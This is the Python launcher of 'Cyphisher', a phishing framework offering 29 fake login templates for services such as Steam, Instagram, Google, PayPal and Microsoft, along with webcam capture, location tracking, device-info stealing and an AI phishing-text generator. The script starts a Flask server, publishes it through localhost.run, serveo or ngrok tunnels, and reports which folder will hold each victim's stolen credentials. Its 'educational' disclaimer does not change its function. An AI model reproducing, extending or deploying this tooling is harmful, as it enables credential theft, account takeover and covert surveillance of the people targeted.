import random
import sys
from rich.panel import Panel
from rich.align import Align
from rich.columns import Columns
from rich.box import ROUNDED
import pyfiglet
import math
import subprocess
import time
import re
import os
import threading
from rich.console import Console

console = Console()
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

try:
    import requests
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    import requests


def Banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    
    ascii_logo = pyfiglet.figlet_format("Cyphisher", font="slant")
    console.print(Align(ascii_logo, align="center"), style="bold green")

    welcome_panel = Panel(
        "[bold magenta]Advanced Phishing Framework[/bold magenta]\n[italic cyan]For Educational & Authorized Testing Only[/italic cyan]",
        title="[bold yellow]Welcome to Cyphisher[/bold yellow]",
        border_style="bright_blue",
        box=ROUNDED,
        padding=(1, 2)
    )
    console.print(Align(welcome_panel, align="center"))

    with console.status("[bold green]Loading modules..."):
        time.sleep(2)

    console.print("\n[bold green]✓ Ready to run![/bold green]\n")
    time.sleep(2)

    lists_ = [
        "[1] Steam", "[2] Instagram", "[3] Location", "[4] Webcam Capture",
        "[5] IG Followers", "[6] Facebook", "[7] Github",
        "[8] Google", "[9] WordPress", "[10] Django Admin", "[11] Netflix",
        "[12] Discord", "[13] Paypal", "[14] Twitter",
        "[15] Yahoo", "[16] Yandex", "[17] Snapchat", "[18] Roblox",
        "[19] Adobe", "[20] LinkedIn",
        "[21] Gitlab", "[22] ebay", "[23] Dropbox", "[24] ChatGPT",
        "[25] DeepSeek", "[26] Info Steal", "[27] Phone Number", "[28] Twitch",
        "[29] Microsoft"
    ]

    special_options = [
        "[30] About",
        "[31] Phishing Content Generator ( AI )",
        "[32] Exit"
    ]

    console.print("[bold underline yellow]Available Templates:[/bold underline yellow]\n")

    term_width = console.size.width or 80
    reserved = 8
    min_panel = 18
    max_panel = 40

    panel_width = (term_width - reserved) // 3
    panel_width = max(min_panel, min(max_panel, panel_width))

    if panel_width < min_panel:
        console.print("[bold red]Terminal too narrow — increase terminal width to show 3 columns side-by-side.[/bold red]\n")

    n = len(lists_)
    chunks_count = 3
    chunk_size = math.ceil(n / chunks_count)
    chunks = [lists_[i:i + chunk_size] for i in range(0, n, chunk_size)]
    while len(chunks) < 3:
        chunks.append([])

    column_panels = []
    for i, chunk in enumerate(chunks[:3]):
        col_items = []
        for item in chunk:
            if any(x in item for x in ["Instagram", "Facebook", "Twitter"]):
                col_items.append(f"[cyan]{item}[/cyan]")
            elif any(x in item for x in ["Paypal", "Google", "Yahoo"]):
                col_items.append(f"[green]{item}[/green]")
            elif any(x in item for x in ["Steam", "XBOX", "Twitch"]):
                col_items.append(f"[magenta]{item}[/magenta]")
            else:
                col_items.append(f"[white]{item}[/white]")

        col_text = "\n".join(col_items) if col_items else " "
        panel = Panel(col_text, box=ROUNDED, border_style="blue", width=panel_width,
                      title=f"[bold]Group {i + 1}[/bold]")
        column_panels.append(panel)

    console.print(Columns(column_panels, equal=True, expand=False))

    special_panels = []
    for option in special_options:
        if "AI" in option:
            panel = Panel(option, border_style="magenta", box=ROUNDED, width=36, padding=(0, 1))
        elif "About" in option:
            panel = Panel(option, border_style="cyan", box=ROUNDED, width=28, padding=(0, 1))
        elif "Exit" in option:
            panel = Panel(option, border_style="red", box=ROUNDED, width=20, padding=(0, 1))
        else:
            panel = Panel(option, border_style="yellow", box=ROUNDED, width=28, padding=(0, 1))
        special_panels.append(panel)

    console.print("\n")
    console.print(Align(Columns(special_panels, equal=False, expand=False), align="center"))
    console.print("\n")


def get_localhost_run_url():
    """استفاده از localhost.run - رایگان و بدون نیاز به نصب"""
    console.print("[cyan]🔄 Using localhost.run (Free & No Installation Required)...[/cyan]")
    
    try:
        # اجرای localhost.run در background
        console.print("[yellow]⏳ Starting localhost.run tunnel...[/yellow]")
        
        process = subprocess.Popen(
            ["ssh", "-R", "80:localhost:5001", "nokey@localhost.run", "-o", "StrictHostKeyChecking=no"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            universal_newlines=True
        )
        
        # خواندن خروجی برای پیدا کردن URL
        console.print("[yellow]⏳ Waiting for tunnel URL (15-30 seconds)...[/yellow]")
        
        timeout = time.time() + 35
        url = None
        
        while time.time() < timeout and url is None:
            line = process.stdout.readline()
            if not line:
                time.sleep(0.5)
                continue
                
            console.print(f"[grey]localhost.run: {line.strip()}[/grey]")
            
            # استخراج URL از خروجی
            patterns = [
                r'https://[a-zA-Z0-9-]+\.lhr\.life',
                r'https://[a-zA-Z0-9-]+\.lhr\.pro',
                r'tunneled.*?(https://[^\s]+)',
                r'your url is.*?(https://[^\s]+)'
            ]
            
            for pattern in patterns:
                matches = re.findall(pattern, line, re.IGNORECASE)
                if matches:
                    url = matches[0]
                    if 'localhost.run' in url or 'lhr.life' in url or 'lhr.pro' in url:
                        console.print(f"[green]✓ localhost.run URL: {url}[/green]")
                        
                        # ذخیره URL
                        try:
                            with open("localhost_url.txt", "w") as f:
                                f.write(url)
                            console.print("[green]✓ URL saved to localhost_url.txt[/green]")
                        except:
                            pass
                            
                        # برگرداندن process و URL
                        return process, url
        
        if url is None:
            console.print("[red]❌ Could not get localhost.run URL[/red]")
            process.terminate()
            return None, None
            
    except Exception as e:
        console.print(f"[red]Error with localhost.run: {e}[/red]")
        return None, None


def get_serveo_url():
    """استفاده از serve.net - جایگزین دیگر"""
    console.print("[cyan]🔄 Trying serveo.net...[/cyan]")
    
    try:
        process = subprocess.Popen(
            ["ssh", "-o", "StrictHostKeyChecking=no", "-R", "80:localhost:5001", "serveo.net"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            universal_newlines=True
        )
        
        console.print("[yellow]⏳ Waiting for serveo tunnel URL...[/yellow]")
        
        timeout = time.time() + 25
        url = None
        
        while time.time() < timeout and url is None:
            line = process.stdout.readline()
            if not line:
                time.sleep(0.5)
                continue
                
            console.print(f"[grey]serveo: {line.strip()}[/grey]")
            
            patterns = [
                r'https://[a-zA-Z0-9-]+\.serveo\.net',
                r'Forwarding.*?(https://[^\s]+)'
            ]
            
            for pattern in patterns:
                matches = re.findall(pattern, line)
                if matches:
                    url = matches[0]
                    console.print(f"[green]✓ serveo URL: {url}[/green]")
                    return process, url
        
        if url is None:
            console.print("[red]❌ Could not get serveo URL[/red]")
            process.terminate()
            return None, None
            
    except Exception as e:
        console.print(f"[red]Error with serveo: {e}[/red]")
        return None, None


def get_ngrok_url():
    """سعی کنیم از ngrok استفاده کنیم اگر کار کرد"""
    console.print("[cyan]🔄 Trying ngrok...[/cyan]")
    
    ngrok_paths = [
        os.path.join(BASE_DIR, "ngrok", "ngrok"),
        "ngrok",
        "/data/data/com.termux/files/usr/bin/ngrok"
    ]
    
    ngrok_path = None
    for path in ngrok_paths:
        if os.path.exists(path):
            ngrok_path = path
            break
    
    if not ngrok_path:
        return None, None

    try:
        # کشتن ngrokهای قبلی
        subprocess.run(['pkill', '-f', 'ngrok'], 
                     stdout=subprocess.DEVNULL, 
                     stderr=subprocess.DEVNULL)
        time.sleep(2)

        # اجرای ngrok
        process = subprocess.Popen(
            [ngrok_path, "http", "5001", "--log=stdout"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            universal_newlines=True
        )

        # صبر برای ngrok
        time.sleep(10)
        
        # سعی کن از API بگیر
        for i in range(5):
            try:
                response = requests.get("http://localhost:4040/api/tunnels", timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    tunnels = data.get("tunnels", [])
                    for tunnel in tunnels:
                        if tunnel.get("proto") == "https":
                            url = tunnel.get("public_url")
                            if url:
                                console.print(f"[green]✓ Ngrok URL: {url}[/green]")
                                return process, url
                time.sleep(2)
            except:
                time.sleep(2)
                continue

        process.terminate()
        return None, None
        
    except Exception as e:
        console.print(f"[yellow]Ngrok failed: {e}[/yellow]")
        return None, None


def start_flask_in_thread():
    """اجرای Flask در thread جداگانه"""
    def run_flask():
        try:
            # اینجا باید کد اجرای Flask تو قرار بگیره
            # برای تست، یک سرور ساده ایجاد می‌کنیم
            from flask import Flask
            app = Flask(__name__)
            
            @app.route('/')
            def index():
                return "Cyphisher is running!"
            
            # اجرا روی پورت 5001
            import threading
            threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5001, debug=False, use_reloader=False)).start()
            
        except Exception as e:
            console.print(f"[red]Flask error: {e}[/red]")
    
    # اجرای Flask در thread جداگانه
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    time.sleep(3)
    console.print("[green]✓ Flask server started on port 5001[/green]")


def get_tunnel_url():
    """دریافت آدرس تونل با اولویت‌های مختلف"""
    
    console.print("[yellow]🔧 Setting up tunnel services...[/yellow]")
    
    # اول localhost.run رو امتحان کن
    process, url = get_localhost_run_url()
    if url:
        return process, url, "localhost.run"
    
    # سپس serveo
    process, url = get_serveo_url()
    if url:
        return process, url, "serveo"
    
    # در نهایت ngrok
    process, url = get_ngrok_url()
    if url:
        return process, url, "ngrok"
    
    console.print("[red]❌ All tunnel services failed![/red]")
    console.print("[yellow]⚠ Please check your internet connection[/yellow]")
    return None, "https://your-tunnel.lhr.life", "none"


def Choice():
    try:
        user_choice = int(input("Select an option (1-32): "))
    except ValueError:
        console.print("[red]Please enter a valid number[/red]")
        return

    # شروع سرور Flask
    start_flask_in_thread()
    
    # گرفتن آدرس تونل
    tunnel_process, tunnel_url, tunnel_type = get_tunnel_url()
    
    if tunnel_process:
        console.print(f"[green]✓ {tunnel_type} tunnel is active[/green]")
    else:
        console.print(f"[yellow]⚠ Using {tunnel_type} (may not be active)[/yellow]")

    console.print(f"\n[+] Your Page {tunnel_type} Link 👇 {tunnel_url}")
    console.print("[+] Press CTRL + C to Stop The Code .\n")

    # اجرای صفحه انتخاب شده
    try:
        if user_choice == 1:
            console.print("[+] Credentials Will be Saved in 👉 [ Steam_Credentials ] 👈 Directory.")
            from Pages import steam
            steam.run()

        elif user_choice == 2:
            console.print("[+] Credentials Will be Saved in 👉 [ insta_Credentials ] 👈 Directory.")
            from Pages import instagram
            instagram.run()

        elif user_choice == 3:
            console.print("[+] Credentials Will be Saved in 👉 [ location_information ] 👈 Directory.")
            from Pages import location
            location.run()

        elif user_choice == 4:
            console.print("[+] Credentials Will be Saved in 👉 [ uploads ] 👈 Directory.")
            from Pages import take_picture
            take_picture.run()

        elif user_choice == 5:
            console.print("[+] Credentials Will be Saved in 👉 [ IG_FOLLOWER ] 👈 Directory.")
            from Pages import IG_Follower
            IG_Follower.run()

        elif user_choice == 6:
            console.print("[+] Credentials Will be Saved in 👉 [ Facebook ] 👈 Directory.")
            from Pages import facebook
            facebook.run()

        elif user_choice == 7:
            console.print("[+] Credentials Will be Saved in 👉 [ Github ] 👈 Directory.")
            from Pages import github
            github.run()

        elif user_choice == 8:
            console.print("[+] Credentials Will be Saved in 👉 [ Google ] 👈 Directory.")
            from Pages import Google
            Google.run()

        elif user_choice == 9:
            console.print("[+] Credentials Will be Saved in 👉 [ WordPress ] 👈 Directory.")
            from Pages import wordpress
            wordpress.run()

        elif user_choice == 10:
            console.print("[+] Credentials Will be Saved in 👉 [ Django ] 👈 Directory.")
            from Pages import django_admin
            django_admin.run()

        elif user_choice == 11:
            console.print("[+] Credentials Will be Saved in 👉 [ Netflix ] 👈 Directory.")
            from Pages import netflix
            netflix.run()

        elif user_choice == 12:
            console.print("[+] Credentials Will be Saved in 👉 [ Discord ] 👈 Directory.")
            from Pages import discord
            discord.run()

        elif user_choice == 13:
            console.print("[+] Credentials Will be Saved in 👉 [ Paypal ] 👈 Directory.")
            from Pages import paypal
            paypal.run()

        elif user_choice == 14:
            console.print("[+] Credentials Will be Saved in 👉 [ Twitter ] 👈 Directory.")
            from Pages import twitter
            twitter.run()

        elif user_choice == 15:
            console.print("[+] Credentials Will be Saved in 👉 [ Yahoo ] 👈 Directory.")
            from Pages import yahoo
            yahoo.run()

        elif user_choice == 16:
            console.print("[+] Credentials Will be Saved in 👉 [ yandex ] 👈 Directory.")
            from Pages import yandex
            yandex.run()

        elif user_choice == 17:
            console.print("[+] Credentials Will be Saved in 👉 [ snapchat ] 👈 Directory.")
            from Pages import snapchat
            snapchat.run()

        elif user_choice == 18:
            console.print("[+] Credentials Will be Saved in 👉 [ Roblox ] 👈 Directory.")
            from Pages import roblox
            roblox.run()

        elif user_choice == 19:
            console.print("[+] Credentials Will be Saved in 👉 [ adobe ] 👈 Directory.")
            from Pages import adobe
            adobe.run()

        elif user_choice == 20:
            console.print("[+] Credentials Will be Saved in 👉 [ LinkedIN ] 👈 Directory.")
            from Pages import linkedin
            linkedin.run()

        elif user_choice == 21:
            console.print("[+] Credentials Will be Saved in 👉 [ Gitlab ] 👈 Directory.")
            from Pages import Gitlab
            Gitlab.run()

        elif user_choice == 22:
            console.print("[+] Credentials Will be Saved in 👉 [ Ebay ] 👈 Directory.")
            from Pages import ebay
            ebay.run()

        elif user_choice == 23:
            console.print("[+] Credentials Will be Saved in 👉 [ Dropbox ] 👈 Directory.")
            from Pages import drop_box
            drop_box.run()

        elif user_choice == 24:
            console.print("[+] Credentials Will be Saved in 👉 [ chatgpt ] 👈 Directory.")
            from Pages import chatgpt_
            chatgpt_.run()

        elif user_choice == 25:
            console.print("[+] Credentials Will be Saved in 👉 [ Deepseek ] 👈 Directory.")
            from Pages import deepseek
            deepseek.run()

        elif user_choice == 26:
            console.print("[+] Credentials Will be Saved in 👉 [ collected_data/all_devices.json ] 👈 Directory.")
            from Pages import Target_information
            Target_information.run()

        elif user_choice == 27:
            console.print("[+] Credentials Will be Saved in 👉 [ phone_data ] 👈 Directory.")
            from Pages import Target_information
            Target_information.run()

        elif user_choice == 28:
            console.print("[+] Credentials Will be Saved in 👉 [ Twitch ] 👈 Directory.")
            from Pages import twitch
            twitch.run()

        elif user_choice == 29:
            console.print("[+] Credentials Will be Saved in 👉 [ Microsoft ] 👈 Directory.")
            from Pages import microsoft
            microsoft.run()

        elif user_choice == 30:
            from ABOUT import About
            About.run()

        elif user_choice == 31:
            from AI import Test
            Test.main_interactive()

        elif user_choice == 32:
            console.print("[+] Exiting...")
            sys.exit()

    except Exception as e:
        console.print(f"[red]Error loading page: {e}[/red]")
    
    # منتظر ماندن تا کاربر متوقف کند
    try:
        if tunnel_process:
            console.print("\n[yellow]📡 Tunnel is running... Press CTRL+C to stop[/yellow]")
            tunnel_process.wait()
    except KeyboardInterrupt:
        console.print("\n[red]✗ Stopping tunnel...[/red]")
        if tunnel_process:
            tunnel_process.terminate()


if __name__ == "__main__":
    while True:
        Banner()
        Choice()
        
        console.print("\n" + "="*50)
        console.print("You Want to Continue? (y/n):")
        user_ = input("y/n: ").lower().strip()
        if user_ == "n":
            console.print("[yellow]👋 Goodbye![/yellow]")
            sys.exit()
        elif user_ == "y":
            console.print("[green]🔄 Restarting...[/green]")
            time.sleep(2)
        else:
            console.print("[yellow]⚠ Invalid input, restarting...[/yellow]")
            time.sleep(2)
